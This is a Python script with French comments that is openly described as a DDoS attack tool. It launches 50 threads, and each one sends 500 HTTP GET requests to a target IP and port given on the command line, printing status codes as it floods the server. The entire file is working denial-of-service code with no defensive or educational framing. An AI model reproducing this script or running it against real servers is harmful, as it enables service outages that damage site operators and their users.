import threading
import requests
import sys

# Paramètres par défaut
NUM_THREADS = 50  # Nombre de threads simultanés
NUM_REQUESTS_PER_THREAD = 500  # Nombre de requêtes par thread

def send_get_requests(target_url):
    """Envoie des requêtes GET au serveur cible."""
    try:
        for _ in range(NUM_REQUESTS_PER_THREAD):
            response = requests.get(target_url)
            print(f"Requête GET envoyée : {response.status_code}")  # Affiche le code de réponse HTTP
    except requests.exceptions.RequestException as e:
        print(f"**Erreur dans l'envoi de la requête : {e}")

def start_ddos(target_url):
    """Lance l'attaque DDoS en envoyant des requêtes GET via plusieurs threads."""
    threads = []
    print(f"Lancement de l'attaque sur {target_url} avec {NUM_THREADS} threads...")

    for _ in range(NUM_THREADS):
        thread = threading.Thread(target=send_get_requests, args=(target_url,))
        thread.start()
        threads.append(thread)

    # Attend que tous les threads terminent
    for thread in threads:
        thread.join()

    print("Attaque terminée.")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print(f"Utilisation : python {sys.argv[0]} <ip_cible> <port_cible>")
        sys.exit(1)

    # Lecture des paramètres depuis les arguments de ligne de commande
    target_ip = sys.argv[1]
    target_port = sys.argv[2]

    # Construction de l'URL cible
    target_url = f"http://{target_ip}:{target_port}"

    try:
        start_ddos(target_url)
    except KeyboardInterrupt:
        print("\nAttaque arrêtée par l'utilisateur.")
        sys.exit()
